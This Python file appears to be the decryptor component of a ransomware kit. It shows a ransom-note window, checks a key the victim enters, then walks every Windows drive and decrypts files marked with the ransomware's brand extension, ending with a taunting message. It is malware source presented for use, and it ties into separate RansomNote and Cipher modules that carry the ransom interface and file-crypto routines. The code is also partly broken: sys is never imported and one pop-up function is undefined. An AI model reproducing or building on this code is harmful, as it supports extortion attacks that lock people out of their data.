from RansomNote import RansomNote, purple_pop_up
from Cipher import Cipher
import os

if __name__ == '__main__':
    cipher = Cipher()
    
    if not cipher.is_windows():
        print('Nothing to do here')
        sys.exit()
        
    ransom_note = RansomNote()
    
    while True:
        try:
            event, values = ransom_note.note.read()
            key = values[0]
            
            if cipher.correct_key(key):
                local_drives = cipher.get_local_drives()

                for ld in local_drives:
                    for root, dirs, files in os.walk(ld):
                        [dirs.remove(d) for d in list(dirs) if d in cipher.PROTECTED_DIRS]
                        for fn in files:
                            full_path = root + os.sep + fn
                            ext=cipher.get_file_extension(full_path)
                            if ext == cipher.BRAND_EXT:
                                print(full_path + ' -> [decrypted]')
                                cipher.symmetric_encrypt_or_decrypt(full_path, opt='decrypt')
                break # salimos del bucle infinito
            else:
                purple_pop_up(text="Wrong key")
                
        except Exception as e:
            wrong_key_popup()
    
    print('All data was successfully decrypted')
    purple_pop_up(text="All data was decrypted successfully. Be careful on the internet next time ;)")
